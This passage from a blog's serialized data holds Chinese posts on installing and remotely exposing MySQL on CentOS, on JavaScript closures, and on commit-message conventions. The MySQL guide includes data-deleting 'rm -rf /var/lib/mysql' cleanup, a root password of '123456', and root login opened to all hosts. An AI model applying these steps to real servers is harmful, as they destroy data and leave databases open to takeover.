class=\"headerlink\" title=\"安装成功后重启 MySQL 服务\"></a>安装成功后重启 MySQL 服务</h4><ul>\n<li>service mysqld restart</li>\n</ul>\n<h4 id=\"查看-MySQL-服务进程和端口\"><a href=\"#查看-MySQL-服务进程和端口\" class=\"headerlink\" title=\"查看 MySQL 服务进程和端口\"></a>查看 MySQL 服务进程和端口</h4><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ps -ef | grep mysql</span><br><span class=\"line\">netstat -tunpl | grep <span class=\"number\">3306</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>ps 命令是 Process Status 的缩写</li>\n<li>ps 命令用来列出系统中当前运行的那些进程。ps 命令列出的是当前那些进程的快照，就是执行 ps 命令的那个时刻的那些进程，如果想要动态的显示进程信息，就可以使用 top 命令。<a href=\"https://linuxtools-rst.readthedocs.io/zh_CN/latest/tool/ps.html#id7\" target=\"_blank\" rel=\"noopener\">ps 命令详情实例查看这里</a></li>\n<li>netstat 是显示各种网络信息的工具</li>\n</ul>\n<h4 id=\"获取-mysql-默认密码\"><a href=\"#获取-mysql-默认密码\" class=\"headerlink\" title=\"获取 mysql 默认密码\"></a>获取 mysql 默认密码</h4><ul>\n<li>grep ‘temporary password’ /var/log/mysqld.log</li>\n<li>如果没有反应，需要重置密码</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql -u root</span><br><span class=\"line\">use mysql;</span><br><span class=\"line\">update user set password=password(<span class=\"string\">'123456'</span>) where user=<span class=\"string\">'root'</span>;</span><br><span class=\"line\"><span class=\"keyword\">delete</span> <span class=\"keyword\">from</span> user where user=<span class=\"string\">''</span>;<span class=\"comment\">//删除空用户</span></span><br><span class=\"line\">systemctl restart mysql<span class=\"comment\">//重启mysql</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"需要远程连接\"><a href=\"#需要远程连接\" class=\"headerlink\" title=\"需要远程连接\"></a>需要远程连接</h4><ul>\n<li>开放 3306 端口</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">systemctl start firewalld.service <span class=\"comment\">//启动防火墙</span></span><br><span class=\"line\">firewall-cmd --permanent --add-port=<span class=\"number\">3306</span>/tcp</span><br><span class=\"line\">firewall-cmd --reload</span><br></pre></td></tr></table></figure>\n<ul>\n<li>开启远程登录</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql -u root -p</span><br><span class=\"line\">use mysql;</span><br><span class=\"line\">update user set host=<span class=\"string\">'%'</span> where user=<span class=\"string\">'root'</span> and host=<span class=\"string\">'localhost'</span>;</span><br><span class=\"line\">exit；</span><br><span class=\"line\">systemctl restart mysql<span class=\"comment\">//重启mysql</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"阿里云远程连接的坑\"><a href=\"#阿里云远程连接的坑\" class=\"headerlink\" title=\"阿里云远程连接的坑\"></a>阿里云远程连接的坑</h2><ul>\n<li>在外面怎么连接 mysql 各种超时，即使把防火墙关了也无济于事。是因为阿里云有个<a href=\"https://help.aliyun.com/document_detail/25471.html\" target=\"_blank\" rel=\"noopener\">安全组策略</a></li>\n<li><a href=\"https://blog.csdn.net/u010955892/article/details/72774920\" target=\"_blank\" rel=\"noopener\">在安全组策略配置 3306 端口开放</a></li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"背景\"><a href=\"#背景\" class=\"headerlink\" title=\"背景\"></a>背景</h2><ul>\n<li>需要给人开发一个项目，然后我让客户自己选购了阿里云的 centos7 系统（他才买了 350 元一年，我很好奇为什么这么便宜，我是 680…杀熟嘛）</li>\n<li>然后让客户用 ssh 工具配置，这样我就可以通过 ssh 来连接他的服务器了</li>\n<li>这个时候我就需要安装 mysql，并在外面来远程连接了</li>\n</ul>\n<h2 id=\"安装-mysql\"><a href=\"#安装-mysql\" class=\"headerlink\" title=\"安装 mysql\"></a>安装 mysql</h2><h4 id=\"安装依赖包\"><a href=\"#安装依赖包\" class=\"headerlink\" title=\"安装依赖包\"></a>安装依赖包</h4><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum -y install gcc gcc-c++ ncurses ncurses-devel cmake bison</span><br></pre></td></tr></table></figure>\n<h6 id=\"yum-和-rpm-是什么\"><a href=\"#yum-和-rpm-是什么\" class=\"headerlink\" title=\"yum 和 rpm 是什么\"></a>yum 和 rpm 是什么</h6><ul>\n<li>yum，是 Yellow dog Updater Modified 的简称，起初是由 yellow dog 这一发行版的开发者 Terra Soft 研发，用 python 写成，那时还叫做 yup(yellow dog updater)，后经杜克大学的 Linux@Duke 开发团队进行改进，遂有此名。</li>\n<li>yum 的宗旨是自动化地升级，安装/移除 rpm 包，收集 rpm 包的相关信息，检查依赖性并自动提示用户解决。</li>\n<li>rpm（二进制包）是 linux 的可执行程序，类似 windows 的 exe 文件</li>\n</ul>\n<h4 id=\"先检测系统是否自带原有版本-mysql-安装包，如果有要先卸载删除，不然不能成功安装和启动\"><a href=\"#先检测系统是否自带原有版本-mysql-安装包，如果有要先卸载删除，不然不能成功安装和启动\" class=\"headerlink\" title=\"先检测系统是否自带原有版本 mysql 安装包，如果有要先卸载删除，不然不能成功安装和启动\"></a>先检测系统是否自带原有版本 mysql 安装包，如果有要先卸载删除，不然不能成功安装和启动</h4><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">rpm -qa | grep mysql 查看有哪些安装包</span><br><span class=\"line\">yum remove mysql mysql-server mysql-libs compat-mysql51 注意这个卸载不干净</span><br><span class=\"line\">rm -rf /<span class=\"keyword\">var</span>/lib/mysql</span><br><span class=\"line\">rm /etc/my.cnf</span><br><span class=\"line\">rpm -qa|grep mysql 再看下有没有删完</span><br><span class=\"line\">whereis mysql 查看残留的目录、如有则删除</span><br></pre></td></tr></table></figure>\n<ul>\n<li>如果发现有安装包，可以用 rpm -e 命令删掉安装包</li>\n</ul>\n<h4 id=\"下载-Mysql-的-repo-源\"><a href=\"#下载-Mysql-的-repo-源\" class=\"headerlink\" title=\"下载 Mysql 的 repo 源\"></a>下载 Mysql 的 repo 源</h4><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mkdi /usr/local/download</span><br><span class=\"line\">cd /usr/local/download/</span><br><span class=\"line\">wget http:<span class=\"comment\">//dev.mysql.com/get/mysql-community-release-el7-5.noarch.rpm</span></span><br><span class=\"line\">wget http:<span class=\"comment\">//dev.mysql.com/get/mysql-community-release-el7-5.noarch.rpm</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"安装-mysql-community-release-el7-5-noarch-rpm-包\"><a href=\"#安装-mysql-community-release-el7-5-noarch-rpm-包\" class=\"headerlink\" title=\"安装 mysql-community-release-el7-5.noarch.rpm 包\"></a>安装 mysql-community-release-el7-5.noarch.rpm 包</h4><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">rpm -ivh mysql-community-release-el7<span class=\"number\">-5.</span>noarch.rpm <span class=\"comment\">//rpm -ivh是安装命令的意思</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"安装-mysql-1\"><a href=\"#安装-mysql-1\" class=\"headerlink\" title=\"安装 mysql\"></a>安装 mysql</h4><ul>\n<li>yum install -y mysql-community-server</li>\n</ul>\n<h4 id=\"安装成功后重启-MySQL-服务\"><a href=\"#安装成功后重启-MySQL-服务\" class=\"headerlink\" title=\"安装成功后重启 MySQL 服务\"></a>安装成功后重启 MySQL 服务</h4><ul>\n<li>service mysqld restart</li>\n</ul>\n<h4 id=\"查看-MySQL-服务进程和端口\"><a href=\"#查看-MySQL-服务进程和端口\" class=\"headerlink\" title=\"查看 MySQL 服务进程和端口\"></a>查看 MySQL 服务进程和端口</h4><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ps -ef | grep mysql</span><br><span class=\"line\">netstat -tunpl | grep <span class=\"number\">3306</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>ps 命令是 Process Status 的缩写</li>\n<li>ps 命令用来列出系统中当前运行的那些进程。ps 命令列出的是当前那些进程的快照，就是执行 ps 命令的那个时刻的那些进程，如果想要动态的显示进程信息，就可以使用 top 命令。<a href=\"https://linuxtools-rst.readthedocs.io/zh_CN/latest/tool/ps.html#id7\" target=\"_blank\" rel=\"noopener\">ps 命令详情实例查看这里</a></li>\n<li>netstat 是显示各种网络信息的工具</li>\n</ul>\n<h4 id=\"获取-mysql-默认密码\"><a href=\"#获取-mysql-默认密码\" class=\"headerlink\" title=\"获取 mysql 默认密码\"></a>获取 mysql 默认密码</h4><ul>\n<li>grep ‘temporary password’ /var/log/mysqld.log</li>\n<li>如果没有反应，需要重置密码</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql -u root</span><br><span class=\"line\">use mysql;</span><br><span class=\"line\">update user set password=password(<span class=\"string\">'123456'</span>) where user=<span class=\"string\">'root'</span>;</span><br><span class=\"line\"><span class=\"keyword\">delete</span> <span class=\"keyword\">from</span> user where user=<span class=\"string\">''</span>;<span class=\"comment\">//删除空用户</span></span><br><span class=\"line\">systemctl restart mysql<span class=\"comment\">//重启mysql</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"需要远程连接\"><a href=\"#需要远程连接\" class=\"headerlink\" title=\"需要远程连接\"></a>需要远程连接</h4><ul>\n<li>开放 3306 端口</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">systemctl start firewalld.service <span class=\"comment\">//启动防火墙</span></span><br><span class=\"line\">firewall-cmd --permanent --add-port=<span class=\"number\">3306</span>/tcp</span><br><span class=\"line\">firewall-cmd --reload</span><br></pre></td></tr></table></figure>\n<ul>\n<li>开启远程登录</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql -u root -p</span><br><span class=\"line\">use mysql;</span><br><span class=\"line\">update user set host=<span class=\"string\">'%'</span> where user=<span class=\"string\">'root'</span> and host=<span class=\"string\">'localhost'</span>;</span><br><span class=\"line\">exit；</span><br><span class=\"line\">systemctl restart mysql<span class=\"comment\">//重启mysql</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"阿里云远程连接的坑\"><a href=\"#阿里云远程连接的坑\" class=\"headerlink\" title=\"阿里云远程连接的坑\"></a>阿里云远程连接的坑</h2><ul>\n<li>在外面怎么连接 mysql 各种超时，即使把防火墙关了也无济于事。是因为阿里云有个<a href=\"https://help.aliyun.com/document_detail/25471.html\" target=\"_blank\" rel=\"noopener\">安全组策略</a></li>\n<li><a href=\"https://blog.csdn.net/u010955892/article/details/72774920\" target=\"_blank\" rel=\"noopener\">在安全组策略配置 3306 端口开放</a></li>\n</ul>\n"},{"title":"浅谈闭包","date":"2018-04-21T14:12:34.000Z","_content":"\n## 闭包是什么\n\n### 词法作用域\n\n> 先要了解什么是词法作用域\n\n* 作用域是由书写代码时候函数的位置决定的\n* 可以想象函数里面嵌套函数，最里面函数可以方面函数的变量\n* 也就是说内部函数可以读取外部函数的变量\n* 但是我们外部怎么访问内部的局部变量，这就需要闭包\n\n```javascript\n//如果我们在外部想拿到n的变量，可以函数内部返回\n//\nfunction f1() {\n  let n = 999;\n  function f2() {\n    return n;\n  }\n  return f2;\n}\nlet n = f1()();\n```\n\n* 函数可以记住并访问它所在的词法作用域，换言之，它记住了定义时候的位置\n* 然后它在其他作用域执行的时候，带上了它的词法作用域，这就是闭包\n\n## 闭包可以干什么\n\n> 很多高级应用都需要用到闭包来实现，主要用处有三个\n\n* 上面提到的，可以访问内部函数变量\n* 保持内部变量在内存之中\n* 私有变量和模块化\n\n```javascript\nfunction f1() {\n  var n = 999;\n\n  nAdd = function() {\n    n += 1;\n  };\n\n  function f2() {\n    alert(n);\n  }\n\n  return f2;\n}\n\nvar result = f1();\n\nresult(); // 999\n\nnAdd();\n\nresult(); // 1000\n//私有变量和模块化\nvar monitor = (function() {\n  var imgs = [];\n  return function(src) {\n    var img = new Image();\n    imgs.push(img);\n    img.src = src;\n  };\n})();\n```\n\n* 因为 f1 是 f2 的父函数，f2 依赖于 f1 的存在，f2 被赋给了全局变量，所以垃圾回收机制不会回收\n* 因为 f2 不回收，所以 f1 也会存在于内存之中\n* n 的变量就静静呆在内存之中\n* 比如 add(1)(2)(3)=6 就是这样解的\n\n## 闭包的问题\n\n* 闭包会导致变量都保存在内存里面，所以大量闭包会导致性能问题。遇到可以不用的，设置为 null，通知垃圾回收机制回收。\n","source":"_posts/closures.md","raw":"---\ntitle: 浅谈闭包\ndate: 2018-04-21 22:12:34\ntags: javascript\n---\n\n## 闭包是什么\n\n### 词法作用域\n\n> 先要了解什么是词法作用域\n\n* 作用域是由书写代码时候函数的位置决定的\n* 可以想象函数里面嵌套函数，最里面函数可以方面函数的变量\n* 也就是说内部函数可以读取外部函数的变量\n* 但是我们外部怎么访问内部的局部变量，这就需要闭包\n\n```javascript\n//如果我们在外部想拿到n的变量，可以函数内部返回\n//\nfunction f1() {\n  let n = 999;\n  function f2() {\n    return n;\n  }\n  return f2;\n}\nlet n = f1()();\n```\n\n* 函数可以记住并访问它所在的词法作用域，换言之，它记住了定义时候的位置\n* 然后它在其他作用域执行的时候，带上了它的词法作用域，这就是闭包\n\n## 闭包可以干什么\n\n> 很多高级应用都需要用到闭包来实现，主要用处有三个\n\n* 上面提到的，可以访问内部函数变量\n* 保持内部变量在内存之中\n* 私有变量和模块化\n\n```javascript\nfunction f1() {\n  var n = 999;\n\n  nAdd = function() {\n    n += 1;\n  };\n\n  function f2() {\n    alert(n);\n  }\n\n  return f2;\n}\n\nvar result = f1();\n\nresult(); // 999\n\nnAdd();\n\nresult(); // 1000\n//私有变量和模块化\nvar monitor = (function() {\n  var imgs = [];\n  return function(src) {\n    var img = new Image();\n    imgs.push(img);\n    img.src = src;\n  };\n})();\n```\n\n* 因为 f1 是 f2 的父函数，f2 依赖于 f1 的存在，f2 被赋给了全局变量，所以垃圾回收机制不会回收\n* 因为 f2 不回收，所以 f1 也会存在于内存之中\n* n 的变量就静静呆在内存之中\n* 比如 add(1)(2)(3)=6 就是这样解的\n\n## 闭包的问题\n\n* 闭包会导致变量都保存在内存里面，所以大量闭包会导致性能问题。遇到可以不用的，设置为 null，通知垃圾回收机制回收。\n","slug":"closures","published":1,"updated":"2018-04-23T03:55:33.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsm034jn000a0iof1ddho2wm","content":"<h2 id=\"闭包是什么\"><a href=\"#闭包是什么\" class=\"headerlink\" title=\"闭包是什么\"></a>闭包是什么</h2><h3 id=\"词法作用域\"><a href=\"#词法作用域\" class=\"headerlink\" title=\"词法作用域\"></a>词法作用域</h3><blockquote>\n<p>先要了解什么是词法作用域</p>\n</blockquote>\n<ul>\n<li>作用域是由书写代码时候函数的位置决定的</li>\n<li>可以想象函数里面嵌套函数，最里面函数可以方面函数的变量</li>\n<li>也就是说内部函数可以读取外部函数的变量</li>\n<li>但是我们外部怎么访问内部的局部变量，这就需要闭包</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//如果我们在外部想拿到n的变量，可以函数内部返回</span></span><br><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">f1</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> n = <span class=\"number\">999</span>;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">f2</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> n;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> f2;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">let</span> n = f1()();</span><br></pre></td></tr></table></figure>\n<ul>\n<li>函数可以记住并访问它所在的词法作用域，换言之，它记住了定义时候的位置</li>\n<li>然后它在其他作用域执行的时候，带上了它的词法作用域，这就是闭包</li>\n</ul>\n<h2 id=\"闭包可以干什么\"><a href=\"#闭包可以干什么\" class=\"headerlink\" title=\"闭包可以干什么\"></a>闭包可以干什么</h2><blockquote>\n<p>很多高级应用都需要用到闭包来实现，主要用处有三个</p>\n</blockquote>\n<ul>\n<li>上面提到的，可以访问内部函数变量</li>\n<li>保持内部变量在内存之中</li>\n<li>私有变量和模块化</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">f1</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> n = <span class=\"number\">999</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  nAdd = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    n += <span class=\"number\">1</span>;</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">f2</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    alert(n);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> f2;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> result = f1();</span><br><span class=\"line\"></span><br><span class=\"line\">result(); <span class=\"comment\">// 999</span></span><br><span class=\"line\"></span><br><span class=\"line\">nAdd();</span><br><span class=\"line\"></span><br><span class=\"line\">result(); <span class=\"comment\">// 1000</span></span><br><span class=\"line\"><span class=\"comment\">//私有变量和模块化</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> monitor = (<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> imgs = [];</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">src</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> img = <span class=\"keyword\">new</span> Image();</span><br><span class=\"line\">    imgs.push(img);</span><br><span class=\"line\">    img.src = src;</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">&#125;)();</span><br></pre></td></tr></table></figure>\n<ul>\n<li>因为 f1 是 f2 的父函数，f2 依赖于 f1 的存在，f2 被赋给了全局变量，所以垃圾回收机制不会回收</li>\n<li>因为 f2 不回收，所以 f1 也会存在于内存之中</li>\n<li>n 的变量就静静呆在内存之中</li>\n<li>比如 add(1)(2)(3)=6 就是这样解的</li>\n</ul>\n<h2 id=\"闭包的问题\"><a href=\"#闭包的问题\" class=\"headerlink\" title=\"闭包的问题\"></a>闭包的问题</h2><ul>\n<li>闭包会导致变量都保存在内存里面，所以大量闭包会导致性能问题。遇到可以不用的，设置为 null，通知垃圾回收机制回收。</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"闭包是什么\"><a href=\"#闭包是什么\" class=\"headerlink\" title=\"闭包是什么\"></a>闭包是什么</h2><h3 id=\"词法作用域\"><a href=\"#词法作用域\" class=\"headerlink\" title=\"词法作用域\"></a>词法作用域</h3><blockquote>\n<p>先要了解什么是词法作用域</p>\n</blockquote>\n<ul>\n<li>作用域是由书写代码时候函数的位置决定的</li>\n<li>可以想象函数里面嵌套函数，最里面函数可以方面函数的变量</li>\n<li>也就是说内部函数可以读取外部函数的变量</li>\n<li>但是我们外部怎么访问内部的局部变量，这就需要闭包</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//如果我们在外部想拿到n的变量，可以函数内部返回</span></span><br><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">f1</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> n = <span class=\"number\">999</span>;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">f2</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> n;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> f2;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">let</span> n = f1()();</span><br></pre></td></tr></table></figure>\n<ul>\n<li>函数可以记住并访问它所在的词法作用域，换言之，它记住了定义时候的位置</li>\n<li>然后它在其他作用域执行的时候，带上了它的词法作用域，这就是闭包</li>\n</ul>\n<h2 id=\"闭包可以干什么\"><a href=\"#闭包可以干什么\" class=\"headerlink\" title=\"闭包可以干什么\"></a>闭包可以干什么</h2><blockquote>\n<p>很多高级应用都需要用到闭包来实现，主要用处有三个</p>\n</blockquote>\n<ul>\n<li>上面提到的，可以访问内部函数变量</li>\n<li>保持内部变量在内存之中</li>\n<li>私有变量和模块化</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">f1</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> n = <span class=\"number\">999</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  nAdd = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    n += <span class=\"number\">1</span>;</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">f2</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    alert(n);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> f2;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> result = f1();</span><br><span class=\"line\"></span><br><span class=\"line\">result(); <span class=\"comment\">// 999</span></span><br><span class=\"line\"></span><br><span class=\"line\">nAdd();</span><br><span class=\"line\"></span><br><span class=\"line\">result(); <span class=\"comment\">// 1000</span></span><br><span class=\"line\"><span class=\"comment\">//私有变量和模块化</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> monitor = (<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> imgs = [];</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">src</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> img = <span class=\"keyword\">new</span> Image();</span><br><span class=\"line\">    imgs.push(img);</span><br><span class=\"line\">    img.src = src;</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">&#125;)();</span><br></pre></td></tr></table></figure>\n<ul>\n<li>因为 f1 是 f2 的父函数，f2 依赖于 f1 的存在，f2 被赋给了全局变量，所以垃圾回收机制不会回收</li>\n<li>因为 f2 不回收，所以 f1 也会存在于内存之中</li>\n<li>n 的变量就静静呆在内存之中</li>\n<li>比如 add(1)(2)(3)=6 就是这样解的</li>\n</ul>\n<h2 id=\"闭包的问题\"><a href=\"#闭包的问题\" class=\"headerlink\" title=\"闭包的问题\"></a>闭包的问题</h2><ul>\n<li>闭包会导致变量都保存在内存里面，所以大量闭包会导致性能问题。遇到可以不用的，设置为 null，通知垃圾回收机制回收。</li>\n</ul>\n"},{"title":"commit规范","date":"2018-10-19T08:20:54.000Z","_content":"\n# 背景\n\n> 团队如果采用 [Angular 的提交规范](https://github.com/isLishude/blog/issues/69)，有方便的插件，可放心食用。\n\n- 对 git commit -m \"不知道提交些什么\"——这样的 commit 说拒绝。\n- 生成易读的 commit，可以方便回退版本以及 code-review。\n\n# 使用说明\n\n### 第一种方式（并非自定义,使用 ng 团队）\n\n> 无法定义自己的模块/组件（scopes）,比如项目具体业务的页面\n\n- 确保全局安装或者该项目已经有了 commitizen ，命令：npm i -g commitizen / npm i -D commitizen\n- 查看 package.json，看看是否有 config 选项，并且里面 commitizen 选项，如果有则跳过第三个步骤。\n- 安装 `adapter` 配置 commit message，例如，要使用 Angular 的 commit message 格式，可以安装 `cz-conventional-changelog`，执行`commitizen init cz-conventional-changelog --save --save-exact`\n- `git commit`以后提交使用`git cz`\n\n### 第二钟方式\n\n> 自定义程度较高，可以有自己想要的模块\n\n- 确保全局安装或者该项目已经有了 commitizen 和 cz-customizable\n- 查看 package.json，看看是否有 config 选项，并且里面 commitizen 选项，如果有则跳过第三个步骤。\n- 该项目下手动新建`.cz-config.js`文件，如下\n\n```javascript\n\"use strict\";\nmodule.exports = {\n  // 不要更改types, 只允许出现这几种\n  types: [\n    {\n      value: \"wip\",\n      name: \"wip：大版本功能开发阶段性提交\"\n    },\n    { value: \"feat\", name: \"feat：完整新功能提交\" },\n    { value: \"fix\", name: \"fix：修复bug\" },\n    {\n      value: \"build\",\n      name: \"build：打包，准备发布\"\n    },\n    { value: \"docs\", name: \"docs：只修改了文档相关的文件，例如修改README.md\" },\n    {\n      value: \"style\",\n      name:\n        \"style：代码风格、不影响代码功能的更改，例如修改空格缩进，换行规范等n\"\n    },\n    {\n      value: \"refactor\",\n      name: \"refactor：既不修复错误也不添加新功能的代码更改，例如重构\"\n    },\n    {\n      value: \"chore\",\n      name:\n        